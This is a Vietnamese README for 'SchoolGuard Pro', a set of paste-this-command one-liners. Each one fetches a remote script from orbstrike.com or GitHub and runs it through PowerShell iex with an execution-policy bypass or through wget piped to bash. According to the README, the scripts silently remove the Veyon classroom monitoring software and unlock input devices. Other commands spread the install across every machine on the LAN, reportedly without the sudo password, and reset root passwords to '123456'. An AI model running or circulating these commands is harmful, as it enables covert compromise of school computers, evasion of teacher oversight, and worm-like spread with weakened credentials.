# SchoolGuard Pro v3.7 — Headless One-Command Deployment (Windows & Xubuntu)

Hệ thống tự động hóa triển khai **1 lệnh duy nhất (One-Command Master Setup)** — tự động gỡ sạch hoàn toàn các trình giám sát cũ (**Veyon**), mở khóa chuột/phím, cấu hình mạng/Wake-on-LAN, cài đặt gói phụ thuộc và kích hoạt dịch vụ chạy ngầm 100% (**Headless / Silent — không hộp thoại pop-up, không thông báo nổi, thanh tiến trình TUI tối giản**).

---

## 🪟 WINDOWS — ONE-COMMAND MASTER SETUP (`Win + R` / PowerShell / CMD)

Bấm **`Win + R`** (hoặc mở **PowerShell** / **CMD**), bấm nút **Copy** ở góc phải khung lệnh bên dưới rồi dán vào và nhấn **Enter**:

### 1. Lệnh Master 1-Chạm (Xóa sạch Veyon + Cài đặt ngầm SchoolGuard trên 1 máy Windows):
* **Lệnh rút gọn (`orbstrike.com`):**
  ```powershell
  powershell -NoProfile -ep Bypass -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('https://orbstrike.com/win'))"
  ```
* **Lệnh trực tiếp từ GitHub:**
  ```powershell
  powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/install_win.ps1'))"
  ```

### 2. Lệnh Master Lan Truyền Toàn Phòng Máy Windows Qua LAN:
*(Chạy trên 1 máy Windows bất kỳ để vừa cài cho máy đó, vừa tự động quét dải mạng `192.168.x.1..254` và đẩy cài đặt ngầm sang toàn bộ máy cùng phòng)*
* **Lệnh rút gọn (`orbstrike.com`):**
  ```powershell
  powershell -NoProfile -ep Bypass -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('https://orbstrike.com/lan-win'))"
  ```
* **Lệnh trực tiếp từ GitHub:**
  ```powershell
  powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/lan_deploy_win.ps1'))"
  ```

---

## 🐧 XUBUNTU / LINUX — ONE-COMMAND MASTER SETUP (`Ctrl + Alt + T`)

Mở Terminal (**`Ctrl + Alt + T`**), bấm biểu tượng **Copy** ở góc phải khung lệnh bên dưới và dán vào Terminal:

### 1. Lệnh Master 1-Chạm (Tự động xóa sạch Veyon + Cài đặt ngầm SchoolGuard trên 1 máy Xubuntu):
*(Tự động xử lý mọi thứ trong 1 lệnh duy nhất, chạy ngầm hoàn toàn ngay cả khi không có mật khẩu `sudo`)*
* **Lệnh rút gọn (`orbstrike.com`):**
  ```bash
  wget -qO- https://orbstrike.com/go | bash
  ```
* **Lệnh trực tiếp từ GitHub:**
  ```bash
  wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/install.sh | bash
  ```

### 2. Lệnh Master Lan Truyền Toàn Phòng Máy Xubuntu Qua LAN:
*(Chỉ cần chạy trên 1 máy học sinh bất kỳ, tự động cài cho máy nguồn và lan truyền ngầm sang toàn bộ các máy đang bật trong phòng)*
* **Lệnh rút gọn (`orbstrike.com`):**
  ```bash
  wget -qO- https://orbstrike.com/lan | bash
  ```
* **Lệnh trực tiếp từ GitHub:**
  ```bash
  wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/lan-deploy.sh | bash
  ```

### 3. Lệnh Tiện Ích Bổ Trợ (Chạy riêng khi cần):
* **Chỉ gỡ sạch & khóa cứng Veyon (Windows):**
  ```powershell
  powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/remove_veyon_win.ps1'))"
  ```
* **Chỉ gỡ sạch & khóa cứng Veyon (Xubuntu):**
  ```bash
  wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/remove-veyon.sh | bash
  ```
* **Đặt lại mật khẩu `sudo` / `root` về `123456` (Xubuntu):**
  ```bash
  wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/reset-sudo.sh | bash
  ```
